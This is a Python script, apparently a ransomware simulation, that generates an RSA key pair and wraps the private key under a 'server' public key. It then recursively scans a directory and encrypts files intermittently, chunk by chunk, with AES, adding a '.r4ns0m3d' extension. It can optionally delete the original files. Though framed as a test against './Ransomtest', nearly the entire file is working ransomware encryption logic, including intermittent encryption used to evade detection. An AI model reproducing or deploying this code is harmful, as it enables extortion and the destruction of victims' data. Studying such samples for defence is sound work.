import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Editable variables
directory = './Ransomtest' # the directory to encrypt
publickey_file = 'client_public.pem' # file name of public key
fileExtension = '.r4ns0m3d' # use any extension, this will be the file extension of encrypted files
excludeExtension = ['.py', '.pem', '.encryptednormally', '.decrypted', '.decryptednormally', fileExtension] # file extensions to exclude from encryption
chunk_size = 4 # integer value of the size of chunks that files will be split into
intermittent_size = 4 # integer value of how many unencrypted chunks per encrypted chunk
clean_original_files = False # whether the program will delete original unencrypted files after encryption
clean_encrypted_files = True # whether the program will delete pre-existing encrypted files upon startup (useful to clear encrypted files of a previous runtime)

def generate_client_key():
    key = RSA.generate(2048)
    privateKey = key.export_key()
    publicKey = key.publickey().export_key()

    # just for simulation purposes, getting the server public key from the directory
    with open("server_public.pem", 'rb') as f:
        serverPublicKey = f.read()

    # generate a session key to encrypt the client private key
    key = RSA.import_key(serverPublicKey)
    sessionKey = os.urandom(32)

    # encrypt the session key with server public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the client private key with session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    encryptedPrivateKey, tag = cipher.encrypt_and_digest(privateKey)

    with open('client_private.pem', 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, encryptedPrivateKey) ]
        print('Private key saved to client_private.pem')
    
    # save public key to file
    with open('client_public.pem', 'wb') as f:
        f.write(publicKey)
        print('Public key saved to client_public.pem')
    
    return publicKey

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encryptFile(dataFile, publicKey):
    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(32)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    
    # create a new outfile
    fileName = dataFile.split(extension)[0]
    encryptedFile = fileName + extension + fileExtension

    with open(dataFile, 'rb') as f:
        counter = 0
        while chunk := f.read(chunk_size): # split file into x-byte chunks
            print(f"\tCurrent chunk: {chunk}")

            # only encrypt if the counter is divisible by y (i.e. encrypting x bytes for every x*y bytes) else skip and leave the chunk untouched
            if counter % intermittent_size == 0:
                chunk = bytes(chunk) # convert chunk to bytes

                # encrypt the data with the session key
                cipher = AES.new(sessionKey, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(chunk)
                print(f"\t\tEncrypted text: {ciphertext}")

                # write the chunk to outfile
                with open(encryptedFile, 'ab') as out:
                    [ out.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]

            else:
                # write the chunk to outfile without doing anything
                with open(encryptedFile, 'ab') as out:
                    [ out.write(chunk) ]
            
            counter += 1

    # delete original files when finished?
    if clean_original_files:
        os.remove(dataFile)

# generate the client key pair
pubKey = generate_client_key()
# iterate through items in directory and encrypt each one
for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    print(f"Now encrypting {filePath}")
    if fileType in excludeExtension:
        if fileType == fileExtension and clean_encrypted_files:
            os.remove(filePath)
        continue
    encryptFile(filePath, pubKey)